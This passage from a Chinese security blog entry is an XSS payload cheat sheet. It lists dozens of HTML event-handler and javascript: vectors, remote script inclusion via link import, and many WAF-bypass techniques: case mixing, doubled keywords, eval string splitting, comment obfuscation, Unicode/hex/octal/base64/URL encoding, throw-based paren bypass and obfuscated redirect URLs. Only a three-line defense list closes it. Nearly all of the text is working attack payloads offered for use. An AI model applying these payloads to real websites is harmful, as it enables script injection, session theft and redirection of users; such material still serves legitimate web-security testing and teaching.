onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><p>&lt;button&gt;</p><pre><code>元素上点击鼠标时触发&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code></pre><p>&lt;p&gt;</p><pre><code>元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;details&gt;</p><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;select&gt;</p><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt;</code></pre><p>&lt;video&gt;</p><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;audio&gt;</p><pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>&lt;textarea&gt;</p><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><p>&lt;keygen&gt;</p><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><p>&lt;marquee&gt;</p><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><p>&lt;isindex&gt;</p><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><p>利用link远程包含js文件</p><pre><code>在无CSP的情况下才可以&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><p>javascript伪协议</p><pre><code>&lt;a&gt;标签&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;&lt;iframe&gt;标签&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;&lt;img&gt;标签&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下&lt;form&gt;标签&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><p>expression属性</p><pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</code></pre><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><p>过滤空格</p><pre><code>用 / 代替空格&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>过滤关键字</p><pre><code>大小写绕过&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;字符拼接(利用eval)&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;字符拼接(利用top)&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)</code></pre><p>其他字符混淆</p><pre><code>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了下面举几个简单的例子可利用注释、标签的优先级等&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p>编码绕过</p><pre><code>Unicode编码绕过&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;url编码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;Ascii码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;Hex绕过&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;八进制绕过&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;base64绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>过滤双引号，单引号</p><pre><code>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;使用编码绕过，具体看上面列举的例子</code></pre><p>过滤括号</p><pre><code>当括号被过滤的时候可以使用throw来绕过&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code></pre><p>过滤url地址</p><pre><code>使用url编码&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;使用IP&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)使用中文逗号代替英文逗号&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//会自动跳转到百度</code></pre><p>htmlspecialchars() 函数实体化HTML</p><pre><code>q&#39; onclick=&#39;alert(123)    //没有实体化引号的情况下</code></pre><p>注：innerHtml不会执行script和svg标签</p><p>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p><p>拓展链接：<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p><p>xss防御：</p><p>​1、过滤</p><p>​2、httponly -&gt;让js无法读取到httponly保护的cookie字段（可以找到探针phpinfo）</p><p>​3、HTML实体化（转义）</p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
